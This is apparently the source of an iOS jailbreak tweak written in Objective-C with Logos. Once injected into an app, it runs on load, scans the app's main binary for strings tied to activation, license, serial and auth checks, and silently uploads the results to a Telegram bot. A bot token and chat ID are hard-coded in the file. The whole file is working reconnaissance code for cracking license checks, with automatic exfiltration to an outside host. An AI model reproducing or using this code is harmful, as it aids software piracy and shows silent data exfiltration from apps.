#import <UIKit/UIKit.h>
#import <substrate.h>
#import <mach-o/dyld.h>

// --- CONFIGURATION ---
#define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
#define TG_CHAT_ID @"7730331218"

// --- HELPER ---
void sendText(NSString *text) {
    @try {
        NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
                            TG_TOKEN, TG_CHAT_ID, 
                            [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
        [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:urlStr] completionHandler:nil] resume];
    } @catch (NSException *e) {}
}

NSData *createBodyWithBoundary(NSString *boundary, NSString *filename, NSData *data) {
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"document\"; filename=\"%@\"\r\n", filename] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: text/plain\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:data];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

// --- MAIN BINARY STRINGS DUMP ---
void dumpMainBinaryStrings() {
    // 1. Target the Main Executable
    NSString *binaryPath = [NSBundle mainBundle].executablePath;
    NSString *appName = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleDisplayName"];
    
    sendText([NSString stringWithFormat:@"🕵️‍♂️ SCANNING MAIN BINARY: %@\n\nLooking for activation keywords...", [binaryPath lastPathComponent]]);

    NSData *binaryData = [NSData dataWithContentsOfFile:binaryPath];
    if (!binaryData) { sendText(@"❌ Failed to read main binary."); return; }
    
    const char *bytes = (const char *)[binaryData bytes];
    NSUInteger length = [binaryData length];
    NSMutableString *dump = [NSMutableString stringWithFormat:@"/* STRINGS DUMP FOR %@ */\n\n", appName];
    
    char buffer[1024];
    int bufIndex = 0;
    
    // 2. Extract Strings
    for (NSUInteger i = 0; i < length; i++) {
        char c = bytes[i];
        if (c >= 32 && c <= 126) {
            if (bufIndex < 1023) buffer[bufIndex++] = c;
        } else {
            if (bufIndex >= 4) { // Filter short noise
                buffer[bufIndex] = '\0';
                NSString *str = [NSString stringWithUTF8String:buffer];
                
                // 3. SMART FILTER: Only save interesting strings
                // This reduces file size and highlights the target.
                if ([str localizedCaseInsensitiveContainsString:@"activ"] ||
                    [str localizedCaseInsensitiveContainsString:@"license"] ||
                    [str localizedCaseInsensitiveContainsString:@"code"] ||
                    [str localizedCaseInsensitiveContainsString:@"valid"] ||
                    [str localizedCaseInsensitiveContainsString:@"verify"] ||
                    [str localizedCaseInsensitiveContainsString:@"key"] ||
                    [str localizedCaseInsensitiveContainsString:@"serial"] ||
                    [str localizedCaseInsensitiveContainsString:@"auth"] ||
                    [str localizedCaseInsensitiveContainsString:@"expired"]) {
                    
                    [dump appendFormat:@"%@\n", str];
                }
            }
            bufIndex = 0;
        }
    }

    // 4. Upload
    NSData *fileData = [dump dataUsingEncoding:NSUTF8StringEncoding];
    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument?chat_id=%@", TG_TOKEN, TG_CHAT_ID];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
    [request setHTTPMethod:@"POST"];
    NSString *boundary = @"Boundary-MainDump";
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:createBodyWithBoundary(boundary, @"Main_Binary_Keywords.txt", fileData)];
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:nil] resume];
}

%ctor {
    dispatch_async(dispatch_get_main_queue(), ^{
        dumpMainBinaryStrings();
    });
}
